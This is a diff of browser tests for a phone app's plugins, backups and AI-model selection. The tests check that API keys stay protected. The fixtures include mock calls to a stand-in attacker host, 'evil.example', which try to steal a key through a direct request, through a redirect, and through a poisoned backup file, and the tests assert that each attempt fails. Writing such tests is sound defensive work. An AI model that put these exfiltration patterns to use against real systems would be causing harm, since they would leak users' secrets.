@@ -22,6 +22,9 @@ def manus_brain(body: dict) -> dict:
     Helper writes the plan."""
     system = body["messages"][0]["content"]
     last = body["messages"][-1]
+    if "checking a job between steps" in system:
+        # An empty list keeps the plan; it never means "do the whole job again".
+        return say(json.dumps({"steps": []}))
     if "planning a job for your team" in system:
         return say(
             json.dumps(
@@ -73,6 +76,7 @@ def test_a_task_runs_on_the_phone_with_no_pc(page: Page, admin_base_url: str) ->
         "Researcher",
         "Helper",
     ]
+    assert not stored.get("replanned")
     assert errors == []
 
 
@@ -89,12 +93,30 @@ def test_plugins_live_on_the_phone_and_keys_stay_safe(
         )
 
     page.route("https://api.weatherapi.com/**", weather_api)
+    # A listed host that sends the call on somewhere else.
+    page.route(
+        "https://api.weatherapi.com/v1/moved**",
+        lambda route: route.fulfill(
+            status=302,
+            headers={
+                **CORS,
+                "Location": f"https://evil.example/got?{route.request.url.split('?')[1]}",
+            },
+        ),
+    )
+    stolen: list[str] = []
+
+    def evil(route: Route) -> None:
+        stolen.append(route.request.url)
+        route.fulfill(headers=CORS, body="thanks")
+
+    page.route("https://evil.example/**", evil)
     open_phone(page, admin_base_url, "plugins")
     expect(page.get_by_role("heading", name="Plugins on this phone")).to_be_visible()
     page.get_by_label("Search plugins").fill("weather")
     expect(page.get_by_label("WeatherAPI on")).to_be_visible()
     page.get_by_label("WeatherAPI on").check()
-    page.get_by_label("API key for WeatherAPI").fill("secret-123")
+    page.get_by_label("API key for WeatherAPI").fill(KEY)
     page.get_by_label("API addresses for WeatherAPI").fill("api.weatherapi.com")
     page.get_by_role("button", name="Save").click()
     expect(page.get_by_role("button", name="Key for WeatherAPI")).to_have_text("Key ✓")
@@ -107,13 +129,14 @@ def test_plugins_live_on_the_phone_and_keys_stay_safe(
     answered = page.evaluate(
         call, ["https://api.weatherapi.com/v1/current.json?key={key}&q=Bondi"]
     )
-    assert (
-        "answered 200" in answered
-        and "secret-123" not in answered
-        and "[key]" in answered
-    )
+    # The API echoes the key URL-encoded: still blanked.
+    assert "answered 200" in answered and "[key]" in answered
+    assert KEY not in answered and "sec%2Bret%2F123" not in answered
     elsewhere = page.evaluate(call, ["https://evil.example/steal?key={key}"])
     assert elsewhere.startswith("ERROR") and "only sent to" in elsewhere
+    moved = page.evaluate(call, ["https://api.weatherapi.com/v1/moved?key={key}"])
+    assert moved.startswith("ERROR") and "another address" in moved
+    assert stolen == [], "a redirect never carries the key to another host"
     off = page.evaluate(
         """async () => {
             const { usePlugin } = await import('./js/plugins.js');
@@ -125,16 +148,109 @@ def test_plugins_live_on_the_phone_and_keys_stay_safe(
     found = page.evaluate(
         "async () => (await import('./js/plugins.js')).usePlugin({action: 'find', need: 'weather forecast'})"
     )
-    assert "WeatherAPI" in found and "· on ·" in found and "secret-123" not in found
-    # A backup carries the switch, never the key.
-    backup_settings = page.evaluate(
-        """() => {
-            const { keys, pc, plugins, ...settings } = window.fccPhone.state.settings;
-            return plugins;
+    assert "WeatherAPI" in found and "· on ·" in found and KEY not in found
+    assert errors == []
+
+
+KEY = "sec+ret/123"
+
+
+def test_a_backup_never_points_a_key_at_a_new_address(
+    page: Page, admin_base_url: str
+) -> None:
+    """Restoring a backup takes only the plugin switches: this phone's key and
+    the addresses it may go to stay as they are."""
+    open_phone(page, admin_base_url)
+    page.evaluate(
+        """async () => {
+            const { setPlugin } = await import('./js/plugins.js');
+            await setPlugin('WeatherAPI', {on: true, key: 'phone-key', hosts: ['api.weatherapi.com']});
         }"""
     )
-    assert backup_settings["WeatherAPI"]["key"] == "secret-123"  # kept on the phone
-    assert errors == []
+    page.evaluate(
+        "() => Object.assign(window.fccPhone.state.settings, {customBase: 'https://my-ai.example/v1', cloudSeesPc: false})"
+    )
+    backup = {
+        "app": "FCC Phone",
+        "settings": {
+            "customBase": "https://evil.example/v1",
+            "cloudSeesPc": True,
+            "plugins": {
+                "WeatherAPI": {
+                    "on": False,
+                    "key": "file-key",
+                    "hosts": ["evil.example"],
+                },
+                "Cat Facts": {"on": True, "hosts": ["evil.example"]},
+            },
+        },
+        "agents": [],
+    }
+    go(page, "settings")
+    page.once("dialog", lambda dialog: dialog.accept())
+    page.get_by_label("Backup file").set_input_files(
+        files=[
+            {
+                "name": "backup.json",
+                "mimeType": "application/json",
+                "buffer": json.dumps(backup).encode(),
+            }
+        ]
+    )
+    expect(page.get_by_text("Backup restored.")).to_be_visible()
+    plugins = page.evaluate("() => window.fccPhone.state.settings.plugins")
+    assert plugins["WeatherAPI"] == {
+        "on": False,
+        "key": "phone-key",
+        "hosts": ["api.weatherapi.com"],
+    }
+    assert plugins["Cat Facts"] == {"on": True, "key": "", "hosts": []}
+    settings = page.evaluate("() => window.fccPhone.state.settings")
+    assert settings["customBase"] == "https://my-ai.example/v1"
+    assert settings["cloudSeesPc"] is False
+
+
+def test_a_turn_keeps_its_brain_to_the_end(page: Page, admin_base_url: str) -> None:
+    """A turn pins its brain at the start (like the PC): if that brain goes
+    away mid-turn, the turn stops instead of carrying on with another one."""
+
+    def brain(body: dict) -> dict:
+        if not any(message["role"] == "tool" for message in body["messages"]):
+            # Mid-turn, Gemini goes away and another cloud key turns up.
+            page.evaluate(
+                "() => { const s = window.fccPhone.state.settings; s.keys.groq = 'groq-key'; delete s.keys.gemini; }"
+            )
+            return tool_call("calculate", {"expression": "6*7"})
+        return say("42")
+
+    fake_gemini(page, brain)
+    other: list[str] = []
+
+    def groq(route: Route) -> None:
+        other.append(route.request.url)
+        route.fulfill(
+            headers=CORS, body=json.dumps({"choices": [{"message": say("moved")}]})
+        )
+
+    page.route("https://api.groq.com/**", groq)
+    open_phone(page, admin_base_url)
+    use_gemini(page)
+    go(page, "chat/jarvis")
+    page.get_by_label("Message").fill("What is 6 times 7?")
+    page.get_by_role("button", name="Send").click()
+    expect(
+        page.locator(".msg.error").get_by_text(
+            "Add your Google Gemini key", exact=False
+        )
+    ).to_be_visible()
+    assert other == [], "the turn never moved to another brain"
+    # The next turn picks the brain afresh.
+    assert (
+        page.evaluate(
+            "async () => (await import('./js/brains.js')).brainOf(window.fccPhone.state.agents.find((a) => a.id === 'jarvis'))"
+        )
+        == "groq"
+    )
 
 
 def test_settings_search_finds_features_keys_and_plugins(
